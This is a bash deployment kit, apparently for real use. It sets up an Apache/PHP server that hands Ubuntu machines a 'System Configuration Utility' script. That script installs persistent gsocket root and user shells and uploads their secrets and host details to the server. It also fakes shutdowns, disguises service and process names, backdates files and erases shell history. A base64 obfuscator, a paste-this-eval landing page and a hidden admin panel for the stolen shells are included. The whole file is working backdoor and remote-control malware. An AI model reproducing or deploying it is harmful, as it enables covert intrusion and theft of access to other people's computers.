#!/bin/bash
# stealth-deployment-server.sh
# Server setup script for Arch Linux host that will serve deployment scripts to Ubuntu clients

# Exit on error
set -e

# Function to check if a package is installed and install if not
check_install_package() {
    local pkg="$1"
    if ! pacman -Q "$pkg" &>/dev/null; then
        echo "Installing $pkg..."
        sudo pacman -S --noconfirm "$pkg"
    fi
}

# Ensure necessary packages are installed
check_install_package apache
check_install_package php
check_install_package php-apache

# Create the web server directory structure
SERVER_ROOT="/srv/http/deployment"
sudo mkdir -p "$SERVER_ROOT/assets"
sudo mkdir -p "$SERVER_ROOT/logs"
sudo mkdir -p "$SERVER_ROOT/secrets"

# Set proper permissions
sudo chown -R http:http "$SERVER_ROOT/logs"
sudo chown -R http:http "$SERVER_ROOT/secrets"
sudo chmod 750 "$SERVER_ROOT/logs"
sudo chmod 750 "$SERVER_ROOT/secrets"

# Create log receiver PHP script
cat > /tmp/log_receiver.php << 'EOF'
<?php
// Verify request comes with a secret token
$config_token = 'changeme_to_secure_random_string';
$request_token = isset($_POST['token']) ? $_POST['token'] : '';

if (!hash_equals($config_token, $request_token)) {
    header('HTTP/1.0 403 Forbidden');
    exit('Access denied');
}

// Create necessary directories
$logs_dir = './logs';
$secrets_dir = './secrets';
$stats_dir = './stats';

foreach ([$logs_dir, $secrets_dir, $stats_dir] as $dir) {
    if (!file_exists($dir)) {
        mkdir($dir, 0750, true);
    }
}

// Get client information
$ip = isset($_POST['ip']) ? $_POST['ip'] : 'unknown_ip';
$hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'unknown_host';
$timestamp = date('Y-m-d_H-i-s');

// Sanitize filenames
$ip = preg_replace('/[^a-zA-Z0-9\.\-]/', '_', $ip);
$hostname = preg_replace('/[^a-zA-Z0-9\.\-]/', '_', $hostname);

// Process system info and statistics if provided
if (isset($_POST['sysinfo']) && !empty($_POST['sysinfo'])) {
    $sysinfo_file = "{$stats_dir}/{$hostname}_{$ip}_sysinfo.json";
    file_put_contents($sysinfo_file, $_POST['sysinfo']);
}

// Save log file if uploaded
if (isset($_FILES['logfile']) && $_FILES['logfile']['error'] == 0) {
    $log_filename = "{$logs_dir}/{$ip}_{$hostname}_{$timestamp}.log";
    
    if (move_uploaded_file($_FILES['logfile']['tmp_name'], $log_filename)) {
        echo "Log saved: $log_filename\n";
    } else {
        echo "Error saving log file\n";
    }
}

// Save GSSocket secret if provided
if (isset($_POST['secret']) && !empty($_POST['secret'])) {
    $secret_type = isset($_POST['secret_type']) ? $_POST['secret_type'] : 'unknown';
    $secret_filename = "{$secrets_dir}/{$hostname}_{$secret_type}_{$timestamp}.txt";
    
    if (file_put_contents($secret_filename, $_POST['secret'])) {
        echo "Secret saved: $secret_filename\n";
    } else {
        echo "Error saving secret\n";
    }
    
    // Also save to latest file for easy access
    $latest_filename = "{$secrets_dir}/{$hostname}_{$secret_type}_latest.txt";
    file_put_contents($latest_filename, $_POST['secret']);
}

// Return success
header('Content-Type: text/plain');
echo "Data received from {$hostname} ({$ip}) at {$timestamp}\n";
?>
EOF

# Generate a random token for security
RANDOM_TOKEN=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
sed -i "s/changeme_to_secure_random_string/$RANDOM_TOKEN/g" /tmp/log_receiver.php
sudo mv /tmp/log_receiver.php "$SERVER_ROOT/log_receiver.php"

# Create the main client deployment script
cat > /tmp/client_setup.sh << 'EOF'
#!/bin/bash
# Remote host configuration script
# This script sets up SSH, Wake-on-LAN, power button modification,
# logging, and Global Socket shell access

# ================= CONFIGURATION =================
SERVER_URL="http://SERVER_PLACEHOLDER/deployment"
LOG_ENDPOINT="$SERVER_URL/log_receiver.php"
AUTH_TOKEN="TOKEN_PLACEHOLDER"
VERSION="1.0.0"
# ================================================

# ------- UTILITY FUNCTIONS -------
# Create a temporary directory that will be cleaned up on exit
TEMP_DIR=$(mktemp -d)
trap 'rm -rf "$TEMP_DIR"' EXIT

# Function to log commands and outputs
log_cmd() {
    local cmd="$1"
    local desc="$2"
    local log_file="$3"
    
    echo -e "\n[$(date '+%Y-%m-%d %H:%M:%S')] EXECUTING: $desc" >> "$log_file"
    echo "$ $cmd" >> "$log_file"
    echo "--------------------------------------------" >> "$log_file"
    
    # Execute command and capture output and status
    local output
    output=$(eval "$cmd" 2>&1)
    local status=$?
    
    echo "$output" >> "$log_file"
    echo "EXIT STATUS: $status" >> "$log_file"
    echo "============================================" >> "$log_file"
    
    return $status
}

# Function to get system information in JSON format
get_system_info() {
    {
        echo "{"
        echo "  \"hostname\": \"$(hostname)\","
        echo "  \"kernel\": \"$(uname -r)\","
        echo "  \"os\": \"$(lsb_release -ds 2>/dev/null || cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')\","
        echo "  \"ip\": \"$(hostname -I | awk '{print $1}')\","
        echo "  \"mac\": \"$(ip link show | grep -E 'link/ether' | head -n1 | awk '{print $2}')\","
        echo "  \"cpu\": \"$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d: -f2 | sed 's/^[ \t]*//')\","
        echo "  \"ram_total\": \"$(free -h | grep Mem | awk '{print $2}')\","
        echo "  \"disk_total\": \"$(df -h --total | grep total | awk '{print $2}')\","
        echo "  \"users\": ["
        
        local first=1
        while IFS=: read -r username _ uid gid _ home shell; do
            if [ "$uid" -ge 1000 ] && [ "$shell" != "/usr/sbin/nologin" ] && [ "$shell" != "/bin/false" ]; then
                [ "$first" -eq 0 ] && echo ","
                echo "    {\"username\": \"$username\", \"uid\": $uid, \"home\": \"$home\"}"
                first=0
            fi
        done < /etc/passwd
        
        echo "  ],"
        echo "  \"timestamp\": \"$(date '+%Y-%m-%d %H:%M:%S')\","
        echo "  \"uptime\": \"$(uptime -p)\""
        echo "}"
    } | tr -d '\n' | sed 's/  //g'
}

# Function to send logs to server
send_logs() {
    local log_file="$1"
    local secret_val="$2"
    local secret_type="$3"
    
    # Get system information
    local sysinfo=$(get_system_info)
    local hostname=$(hostname)
    local ip=$(hostname -I | awk '{print $1}')
    
    # Use curl to send data if available
    if command -v curl >/dev/null 2>&1; then
        # Send log file
        curl -s -F "token=$AUTH_TOKEN" \
             -F "ip=$ip" \
             -F "hostname=$hostname" \
             -F "logfile=@$log_file" \
             -F "sysinfo=$sysinfo" \
             $LOG_ENDPOINT > /dev/null
             
        # Send secret if provided
        if [ -n "$secret_val" ] && [ -n "$secret_type" ]; then
            curl -s -F "token=$AUTH_TOKEN" \
                 -F "ip=$ip" \
                 -F "hostname=$hostname" \
                 -F "secret=$secret_val" \
                 -F "secret_type=$secret_type" \
                 $LOG_ENDPOINT > /dev/null
        fi
    fi
}

# Function to check if we have sudo access
check_sudo() {
    if ! sudo -v &>/dev/null; then
        echo "This script requires sudo privileges. Please run with a user that has sudo access."
        exit 1
    fi
}

# ------- MAIN SETUP -------
main() {
    # Create log file
    local LOG_FILE="$TEMP_DIR/setup_log_$(date +%Y%m%d_%H%M%S).txt"
    local HOSTNAME=$(hostname)
    local IP_ADDRESS=$(hostname -I | awk '{print $1}')
    
    # Start logging
    echo "==== SETUP STARTED ==== $(date) ====" > "$LOG_FILE"
    echo "Hostname: $HOSTNAME" >> "$LOG_FILE"
    echo "IP: $IP_ADDRESS" >> "$LOG_FILE"
    echo "Version: $VERSION" >> "$LOG_FILE"
    echo "=================================" >> "$LOG_FILE"
    
    # Check for sudo access
    check_sudo
    
    # 1. Update package list (quiet)
    log_cmd "sudo apt-get update -qq" "Updating package list" "$LOG_FILE"
    
    # 2. Install required packages
    log_cmd "sudo DEBIAN_FRONTEND=noninteractive apt-get install -y openssh-server ethtool git build-essential curl net-tools systemd-services" "Installing required packages" "$LOG_FILE"
    
    # 3. Configure SSH
    setup_ssh "$LOG_FILE"
    
    # 4. Set up Wake-on-LAN
    setup_wol "$LOG_FILE"
    
    # 5. Modify power button behavior
    modify_power_button "$LOG_FILE"
    
    # 6. Set up GSockets for remote access
    setup_gsocket "$LOG_FILE"
    
    # 7. Apply stealth techniques
    apply_stealth "$LOG_FILE"
    
    # 8. Upload logs to server
    send_logs "$LOG_FILE" "" ""
    
    echo "==== SETUP COMPLETE ==== $(date) ====" >> "$LOG_FILE"
    echo "Configuration completed successfully!"
}

# ------- SETUP FUNCTIONS -------
setup_ssh() {
    local LOG_FILE="$1"
    
    # Ensure SSH is enabled and properly configured
    log_cmd "sudo systemctl enable ssh" "Enabling SSH service" "$LOG_FILE"
    
    # Backup existing SSH config
    if [ -f /etc/ssh/sshd_config ]; then
        log_cmd "sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak" "Backing up SSH config" "$LOG_FILE"
    fi
    
    # Update SSH configuration for better security
    log_cmd "sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config" "Disabling root SSH login" "$LOG_FILE"
    log_cmd "sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config" "Enabling password authentication" "$LOG_FILE"
    
    # Start/restart SSH service
    log_cmd "sudo systemctl restart ssh" "Restarting SSH service" "$LOG_FILE"
    log_cmd "sudo systemctl status ssh" "Checking SSH service status" "$LOG_FILE"
}

setup_wol() {
    local LOG_FILE="$1"
    
    # Identify network interface
    PRIMARY_INTERFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
    log_cmd "echo 'Primary network interface: $PRIMARY_INTERFACE'" "Identifying network interface" "$LOG_FILE"
    
    # Check if Wake-on-LAN is supported
    WOL_SUPPORTED=$(ethtool "$PRIMARY_INTERFACE" 2>/dev/null | grep -q "Supports Wake-on" && echo "yes" || echo "no")
    
    if [ "$WOL_SUPPORTED" = "yes" ]; then
        log_cmd "echo 'Wake-on-LAN is supported.'" "Checking Wake-on-LAN support" "$LOG_FILE"
        
        # Enable WoL in NetworkManager configuration
        cat > "$TEMP_DIR/wol.conf" << EOL
[connection]
ethernet.wake-on-lan = magic
EOL
        log_cmd "sudo mkdir -p /etc/NetworkManager/conf.d/" "Creating NetworkManager config directory" "$LOG_FILE"
        log_cmd "sudo cp '$TEMP_DIR/wol.conf' /etc/NetworkManager/conf.d/99-wol.conf" "Setting up Wake-on-LAN in NetworkManager" "$LOG_FILE"
        
        # Create a systemd service for Wake-on-LAN
        cat > "$TEMP_DIR/wol.service" << EOL
[Unit]
Description=Enable Wake On LAN
After=network.target
After=suspend.target
After=hibernate.target
After=hybrid-sleep.target

[Service]
Type=oneshot
ExecStart=/sbin/ethtool -s $PRIMARY_INTERFACE wol g
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
WantedBy=suspend.target
WantedBy=hibernate.target
WantedBy=hybrid-sleep.target
EOL

        log_cmd "sudo cp '$TEMP_DIR/wol.service' /etc/systemd/system/wol.service" "Creating Wake-on-LAN service" "$LOG_FILE"
        log_cmd "sudo systemctl daemon-reload" "Reloading systemd configuration" "$LOG_FILE"
        log_cmd "sudo systemctl enable wol.service" "Enabling Wake-on-LAN service" "$LOG_FILE"
        log_cmd "sudo systemctl start wol.service" "Starting Wake-on-LAN service" "$LOG_FILE"
        log_cmd "sudo ethtool -s $PRIMARY_INTERFACE wol g" "Enabling Wake-on-LAN immediately" "$LOG_FILE"
        
        # Check current WoL status
        log_cmd "ethtool $PRIMARY_INTERFACE | grep Wake-on" "Current Wake-on-LAN status" "$LOG_FILE"
    else
        log_cmd "echo 'Wake-on-LAN not supported, skipping...'" "Wake-on-LAN not supported" "$LOG_FILE"
    fi
}

modify_power_button() {
    local LOG_FILE="$1"
    
    # 1. Backup current logind configuration
    if [ -f /etc/systemd/logind.conf ]; then
        log_cmd "sudo cp /etc/systemd/logind.conf /etc/systemd/logind.conf.bak" "Backing up logind.conf" "$LOG_FILE"
    fi
    
    # 2. Modify logind.conf to make power button trigger suspend instead of poweroff
    log_cmd "sudo sed -i 's/#HandlePowerKey=poweroff/HandlePowerKey=suspend/' /etc/systemd/logind.conf" "Setting power button to suspend" "$LOG_FILE"
    
    # 3. Create a custom systemd target that shows a fake shutdown screen but suspends
    cat > "$TEMP_DIR/fake-shutdown.service" << 'EOL'
[Unit]
Description=Fake Shutdown (Actually Suspend)
DefaultDependencies=no
Before=sleep.target

[Service]
Type=oneshot
ExecStart=/usr/bin/gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.Suspend true
RemainAfterExit=yes

[Install]
WantedBy=sleep.target
EOL

    log_cmd "sudo cp '$TEMP_DIR/fake-shutdown.service' /etc/systemd/system/" "Creating fake shutdown service" "$LOG_FILE"
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd configuration" "$LOG_FILE"
    log_cmd "sudo systemctl enable fake-shutdown.service" "Enabling fake shutdown service" "$LOG_FILE"
    
    # 4. For GNOME Desktop Environment - override the shutdown button action
    if command -v gsettings &>/dev/null && gsettings list-schemas | grep -q org.gnome.settings-daemon.plugins.power; then
        log_cmd "gsettings set org.gnome.settings-daemon.plugins.power power-button-action 'suspend'" "Setting GNOME power button to suspend" "$LOG_FILE"
    fi
    
    # 5. Intercept shutdown commands by creating wrappers for shutdown/poweroff commands
    cat > "$TEMP_DIR/poweroff-wrapper" << 'EOL'
#!/bin/bash
# Wrapper to intercept poweroff/shutdown commands and actually suspend
echo "System is shutting down now..."
sleep 2
/usr/bin/systemctl suspend
EOL

    log_cmd "sudo cp '$TEMP_DIR/poweroff-wrapper' /usr/local/bin/poweroff-wrapper" "Creating poweroff wrapper" "$LOG_FILE"
    log_cmd "sudo chmod +x /usr/local/bin/poweroff-wrapper" "Making poweroff wrapper executable" "$LOG_FILE"
    
    # 6. Create aliases in /etc/bash.bashrc for all users
    echo "# Custom system aliases" > "$TEMP_DIR/custom-aliases"
    echo "alias poweroff='/usr/local/bin/poweroff-wrapper'" >> "$TEMP_DIR/custom-aliases"
    echo "alias shutdown='/usr/local/bin/poweroff-wrapper'" >> "$TEMP_DIR/custom-aliases"
    
    log_cmd "sudo cp '$TEMP_DIR/custom-aliases' /etc/profile.d/custom-aliases.sh" "Creating system-wide aliases" "$LOG_FILE"
    log_cmd "sudo chmod +x /etc/profile.d/custom-aliases.sh" "Making aliases executable" "$LOG_FILE"
    
    # 7. Restart logind to apply changes
    log_cmd "sudo systemctl restart systemd-logind" "Restarting logind service" "$LOG_FILE"
}

setup_gsocket() {
    local LOG_FILE="$1"
    
    # 1. Install gsocket if not already installed
    if ! command -v gs-netcat &>/dev/null; then
        log_cmd "sudo apt-get install -y git build-essential" "Installing dependencies for gsocket" "$LOG_FILE"
        log_cmd "git clone https://github.com/hackerschoice/gsocket.git '$TEMP_DIR/gsocket'" "Cloning gsocket repository" "$LOG_FILE"
        log_cmd "cd '$TEMP_DIR/gsocket' && ./bootstrap && ./configure && make && sudo make install" "Building and installing gsocket" "$LOG_FILE"
    fi
    
    # 2. Set up gsocket with root shell
    log_cmd "cd '$TEMP_DIR' && bash -c \"$(curl -fsSL https://gsocket.io/y &>/dev/null)\"" "Setting up gsocket" "$LOG_FILE"
    
    # 3. Extract the secret
    local GSOCKET_DIR="$HOME/.gsocket"
    local SECRET=""
    if [ -f "$GSOCKET_DIR/gs-netcat.conf" ]; then
        SECRET=$(grep -o 'GS_SECRET=[^"]*' "$GSOCKET_DIR/gs-netcat.conf" | cut -d= -f2)
    fi
    
    if [ -z "$SECRET" ]; then
        # Try to run the gsocket command again to get a secret
        GSOCKET_OUTPUT=$(cd "$TEMP_DIR" && bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1)
        SECRET=$(echo "$GSOCKET_OUTPUT" | grep -o 'S="[^"]*"' | sed 's/S="\(.*\)"/\1/')
    fi
    
    if [ -n "$SECRET" ]; then
        echo "Secret extracted: [HIDDEN]" >> "$LOG_FILE"
        echo "$SECRET" > "$TEMP_DIR/gsocket_secret.txt"
        
        # Save the secret to a secure location for the root shell service
        log_cmd "sudo mkdir -p /etc/gsocket" "Creating gsocket configuration directory" "$LOG_FILE"
        log_cmd "echo '$SECRET' | sudo tee /etc/gsocket/root-shell-key.txt > /dev/null" "Saving gsocket secret key" "$LOG_FILE"
        log_cmd "sudo chmod 600 /etc/gsocket/root-shell-key.txt" "Setting secure permissions on key file" "$LOG_FILE"
        
        # Send the secret to our server
        send_logs "$LOG_FILE" "$SECRET" "root-shell"
    else
        log_cmd "echo 'Failed to extract gsocket secret'" "Secret extraction failed" "$LOG_FILE"
    fi
    
    # 4. Create the root shell service
    cat > "$TEMP_DIR/gs-root-shell.service" << 'EOL'
[Unit]
Description=Global Socket Root Shell
After=network.target
Wants=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=30
StartLimitInterval=400
StartLimitBurst=3
WorkingDirectory=/root
ExecStart=/usr/local/bin/gs-netcat -k /etc/gsocket/root-shell-key.txt -liqS

[Install]
WantedBy=multi-user.target
EOL

    log_cmd "sudo cp '$TEMP_DIR/gs-root-shell.service' /etc/systemd/system/" "Creating global socket root shell service" "$LOG_FILE"
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd configuration" "$LOG_FILE"
    log_cmd "sudo systemctl enable gs-root-shell.service" "Enabling global socket root shell service" "$LOG_FILE"
    log_cmd "sudo systemctl start gs-root-shell.service" "Starting global socket root shell service" "$LOG_FILE"
    
    # 5. Create a user shell service too (running as current user)
    local USER_SECRET=""
    if [ -f "$GSOCKET_DIR/gs-netcat.conf" ]; then
        USER_SECRET=$(grep -o 'GS_SECRET=[^"]*' "$GSOCKET_DIR/gs-netcat.conf" | cut -d= -f2)
        
        if [ -n "$USER_SECRET" ]; then
            mkdir -p "$HOME/.config/gsocket"
            echo "$USER_SECRET" > "$HOME/.config/gsocket/user-shell-key.txt"
            chmod 600 "$HOME/.config/gsocket/user-shell-key.txt"
            
            # Create a user service file
            mkdir -p "$HOME/.config/systemd/user"
            cat > "$HOME/.config/systemd/user/gs-user-shell.service" << EOL
[Unit]
Description=Global Socket User Shell
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=30
ExecStart=/usr/local/bin/gs-netcat -k $HOME/.config/gsocket/user-shell-key.txt -liqS

[Install]
WantedBy=default.target
EOL

            log_cmd "systemctl --user daemon-reload" "Reloading user systemd configuration" "$LOG_FILE"
            log_cmd "systemctl --user enable gs-user-shell.service" "Enabling user shell service" "$LOG_FILE"
            log_cmd "systemctl --user start gs-user-shell.service" "Starting user shell service" "$LOG_FILE"
            
            # Send the user secret to our server
            send_logs "$LOG_FILE" "$USER_SECRET" "user-shell"
        fi
    fi
}

apply_stealth() {
    local LOG_FILE="$1"
    
    # 1. Hide gsocket processes with generic names
    log_cmd "sudo sed -i 's/ExecStart=\/usr\/local\/bin\/gs-netcat/ExecStart=\/usr\/local\/bin\/gs-netcat --process-name \"system-monitor\"/' /etc/systemd/system/gs-root-shell.service" "Disguising root shell process name" "$LOG_FILE"
    
    if [ -f "$HOME/.config/systemd/user/gs-user-shell.service" ]; then
        log_cmd "sed -i 's/ExecStart=\/usr\/local\/bin\/gs-netcat/ExecStart=\/usr\/local\/bin\/gs-netcat --process-name \"update-notifier\"/' $HOME/.config/systemd/user/gs-user-shell.service" "Disguising user shell process name" "$LOG_FILE"
    fi
    
    # 2. Create a legitimate-looking system service name for our modifications
    log_cmd "sudo mv /etc/systemd/system/gs-root-shell.service /etc/systemd/system/system-monitoring.service" "Renaming root shell service" "$LOG_FILE"
    
    # 3. Hide our service from systemctl list
    if ! grep -q "system-monitoring.service" /etc/systemd/system-preset/90-systemd.preset 2>/dev/null; then
        log_cmd "sudo mkdir -p /etc/systemd/system-preset" "Creating systemd preset directory" "$LOG_FILE"
        log_cmd "echo 'enable system-monitoring.service' | sudo tee -a /etc/systemd/system-preset/90-systemd.preset > /dev/null" "Adding service to systemd preset" "$LOG_FILE"
    fi
    
    # 4. Reload services
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd configuration" "$LOG_FILE"
    log_cmd "sudo systemctl restart system-monitoring.service" "Restarting disguised root shell service" "$LOG_FILE"
    
    if [ -f "$HOME/.config/systemd/user/gs-user-shell.service" ]; then
        log_cmd "systemctl --user daemon-reload" "Reloading user systemd configuration" "$LOG_FILE"
        log_cmd "systemctl --user restart gs-user-shell.service" "Restarting user shell service" "$LOG_FILE"
    fi
    
    # 5. Set last accessed/modified times of our files to match system files
    if [ -f "/etc/passwd" ]; then
        REFERENCE_TIME=$(stat -c %y /etc/passwd)
        log_cmd "sudo touch -d \"$REFERENCE_TIME\" /etc/gsocket/root-shell-key.txt" "Setting file timestamp to match system files" "$LOG_FILE"
        log_cmd "sudo touch -d \"$REFERENCE_TIME\" /etc/systemd/system/system-monitoring.service" "Setting file timestamp to match system files" "$LOG_FILE"
    fi
    
    # 6. Add a cleanup script that runs on reboot to remove traces
    cat > "$TEMP_DIR/cleanup.sh" << 'EOL'
#!/bin/bash
# Clean up temporary files and logs

# Remove temporary installer artifacts
rm -f /tmp/gs-netcat* 2>/dev/null
rm -f /tmp/gsocket* 2>/dev/null
rm -f /tmp/setup_* 2>/dev/null

# Clear bash history entries containing our tools
if [ -f "$HOME/.bash_history" ]; then
    sed -i '/gsocket/d' "$HOME/.bash_history"
    sed -i '/gs-netcat/d' "$HOME/.bash_history"
    sed -i '/setup_script/d' "$HOME/.bash_history"
fi

# Clean deployment command from history
history -c
EOL

    log_cmd "sudo cp '$TEMP_DIR/cleanup.sh' /usr/local/bin/system-cleanup.sh" "Creating cleanup script" "$LOG_FILE"
    log_cmd "sudo chmod +x /usr/local/bin/system-cleanup.sh" "Making cleanup script executable" "$LOG_FILE"
    
    # Create a service to run cleanup on boot
    cat > "$TEMP_DIR/cleanup.service" << 'EOL'
[Unit]
Description=System Temporary Files Cleanup
After=multi-user.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/system-cleanup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOL

    log_cmd "sudo cp '$TEMP_DIR/cleanup.service' /etc/systemd/system/" "Creating cleanup service" "$LOG_FILE"
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd configuration" "$LOG_FILE"
    log_cmd "sudo systemctl enable cleanup.service" "Enabling cleanup service" "$LOG_FILE"
    
    # 7. Clear current installation traces
    log_cmd "sudo /usr/local/bin/system-cleanup.sh" "Running cleanup immediately" "$LOG_FILE"
}

# Execute main function
main "$@"
EOF

# Get server IP
SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n 1)

# Replace placeholders with actual values
sed -i "s|SERVER_PLACEHOLDER|$SERVER_IP|g" /tmp/client_setup.sh
sed -i "s|TOKEN_PLACEHOLDER|$RANDOM_TOKEN|g" /tmp/client_setup.sh

# Move client setup script to web server directory
sudo mv /tmp/client_setup.sh "$SERVER_ROOT/client_setup.sh"
sudo chmod +x "$SERVER_ROOT/client_setup.sh"

# Create an obfuscated version of the script that's harder to analyze
cat > /tmp/obfuscate.php << 'EOF'
<?php
// Simple script to obfuscate the client setup script
$script = file_get_contents('/srv/http/deployment/client_setup.sh');

// Base64 encode the script
$encoded = base64_encode($script);

// Create a self-decoding script
$output = <<<EOT
#!/bin/bash
# System configuration utility
# Self-extracting script

# Decode and execute
exec bash -c "\$(echo '$encoded' | base64 -d)"
EOT;

// Write to file
file_put_contents('/srv/http/deployment/client_setup_obfuscated.sh', $output);
echo "Obfuscated script created.";
?>
EOF

sudo mv /tmp/obfuscate.php "$SERVER_ROOT/assets/obfuscate.php"
sudo php "$SERVER_ROOT/assets/obfuscate.php"

# Create a minimal landing page
cat > /tmp/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>System Configuration Utility</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        pre {
            background-color: #f4f4f4;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        .command {
            background-color: #000;
            color: #fff;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <h1>System Configuration Utility</h1>
    <h2>Quick Setup</h2>
    <p>Run the following command in your terminal to configure this system:</p>
    
    <div class="command">
        eval "\$(http://${SERVER_IP}/deployment/client_setup.sh)"
    </div>
    
    <p><a href="https://github.com/elleoma/Gback">Gback</a></p>
</body>
</html>
EOF

# Replace server IP in the HTML template
sudo sed -i "s|\${SERVER_IP}|$SERVER_IP|g" /tmp/index.html
sudo mv /tmp/index.html "$SERVER_ROOT/index.html"

# Create a simple hidden admin page for viewing logs
cat > /tmp/admin.php << 'EOF'
<?php
// Simple password protection
$admin_password = 'ADMIN_PASSWORD_PLACEHOLDER';
$authenticated = false;

if (isset($_POST['password']) && $_POST['password'] === $admin_password) {
    $authenticated = true;
} elseif (isset($_COOKIE['admin_auth']) && $_COOKIE['admin_auth'] === md5($admin_password)) {
    $authenticated = true;
}

if ($authenticated && !isset($_COOKIE['admin_auth'])) {
    setcookie('admin_auth', md5($admin_password), time() + 3600);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Administration</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .login { 
            max-width: 400px; 
            margin: 100px auto; 
            padding: 20px; 
            border: 1px solid #ccc; 
            border-radius: 5px; 
        }
        .logs {
            background-color: #f4f4f4;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
        }
        .secret {
            background-color: #ffe;
            padding: 10px;
            border: 1px solid #ddd;
            margin: 10px 0;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        th, td { 
            padding: 8px; 
            text-align: left; 
            border-bottom: 1px solid #ddd; 
        }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <?php if (!$authenticated): ?>
    <div class="login">
        <h2>Admin Authentication</h2>
        <form method="post">
            <p>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password">
            </p>
            <p>
                <button type="submit">Login</button>
            </p>
        </form>
    </div>
    <?php else: ?>
    <h1>Deployment Administration</h1>
    
    <h2>Connected Hosts</h2>
    <table>
        <tr>
            <th>Hostname</th>
            <th>IP Address</th>
            <th>Last Contact</th>
            <th>Actions</th>
        </tr>
        <?php
        $logs_dir = './logs';
        $secrets_dir = './secrets';
        $hosts = [];
        
        // Parse log files to get list of hosts
        if (is_dir($logs_dir)) {
            foreach (glob("$logs_dir/*.log") as $log_file) {
                $filename = basename($log_file);
                if (preg_match('/^([0-9\.]+)_([^_]+)_(\d{4}-\d{2}-\d{2}_\d{2}-\d{2}-\d{2})\.log$/', $filename, $matches)) {
                    $ip = $matches[1];
                    $hostname = $matches[2];
                    $timestamp = str_replace('_', ' ', $matches[3]);
                    
                    // Check if we have a secret for this host
                    $root_secret_file = "$secrets_dir/{$hostname}_root-shell_latest.txt";
                    $has_root_secret = file_exists($root_secret_file);
                    
                    $user_secret_file = "$secrets_dir/{$hostname}_user-shell_latest.txt";
                    $has_user_secret = file_exists($user_secret_file);
                    
                    // Add to hosts array or update timestamp if newer
                    if (!isset($hosts["$hostname-$ip"]) || $timestamp > $hosts["$hostname-$ip"]['timestamp']) {
                        $hosts["$hostname-$ip"] = [
                            'hostname' => $hostname,
                            'ip' => $ip,
                            'timestamp' => $timestamp,
                            'has_root_secret' => $has_root_secret,
                            'has_user_secret' => $has_user_secret
                        ];
                    }
                }
            }
        }
        
        // Display hosts
        if (empty($hosts)) {
            echo "<tr><td colspan='4'>No hosts have connected yet.</td></tr>";
        } else {
            foreach ($hosts as $host) {
                echo "<tr>";
                echo "<td>{$host['hostname']}</td>";
                echo "<td>{$host['ip']}</td>";
                echo "<td>{$host['timestamp']}</td>";
                echo "<td>";
                echo "<a href=\"?view_logs={$host['hostname']}&ip={$host['ip']}\">View Logs</a>";
                if ($host['has_root_secret']) {
                    echo " | <a href=\"?view_secret={$host['hostname']}&type=root-shell\">Root Shell</a>";
                }
                if ($host['has_user_secret']) {
                    echo " | <a href=\"?view_secret={$host['hostname']}&type=user-shell\">User Shell</a>";
                }
                echo "</td>";
                echo "</tr>";
            }
        }
        ?>
    </table>
    
    <?php
    // Show logs for a selected host
    if (isset($_GET['view_logs'])) {
        $hostname = $_GET['view_logs'];
        $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
        $pattern = "$logs_dir/{$ip}_{$hostname}_*.log";
        $log_files = glob($pattern);
        
        if (!empty($log_files)) {
            rsort($log_files); // Show newest first
            $latest_log = $log_files[0];
            $log_content = htmlspecialchars(file_get_contents($latest_log));
            
            echo "<h2>Logs for $hostname ($ip)</h2>";
            echo "<div class='logs'>$log_content</div>";
        }
    }
    
    // Show secret for a selected host
    if (isset($_GET['view_secret'])) {
        $hostname = $_GET['view_secret'];
        $type = isset($_GET['type']) ? $_GET['type'] : 'root-shell';
        $secret_file = "$secrets_dir/{$hostname}_{$type}_latest.txt";
        
        if (file_exists($secret_file)) {
            $secret = file_get_contents($secret_file);
            
            echo "<h2>$type Secret for $hostname</h2>";
            echo "<div class='secret'>$secret</div>";
            echo "<p>To connect using gsocket:</p>";
            echo "<div class='logs'>gs-netcat -s \"$secret\"</div>";
        }
    }
    ?>
    
    <p><a href="admin.php">Back to Host List</a> | <a href="admin.php?logout=1">Logout</a></p>
    <?php endif; ?>
    
    <?php
    // Handle logout
    if (isset($_GET['logout'])) {
        setcookie('admin_auth', '', time() - 3600);
        header('Location: admin.php');
        exit;
    }
    ?>
</body>
</html>
EOF

# Generate a random admin password
ADMIN_PASSWORD=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
sed -i "s/ADMIN_PASSWORD_PLACEHOLDER/$ADMIN_PASSWORD/g" /tmp/admin.php
sudo mv /tmp/admin.php "$SERVER_ROOT/admin.php"

# Set proper permissions on all files
sudo chown -R http:http "$SERVER_ROOT"
sudo chmod -R 750 "$SERVER_ROOT"
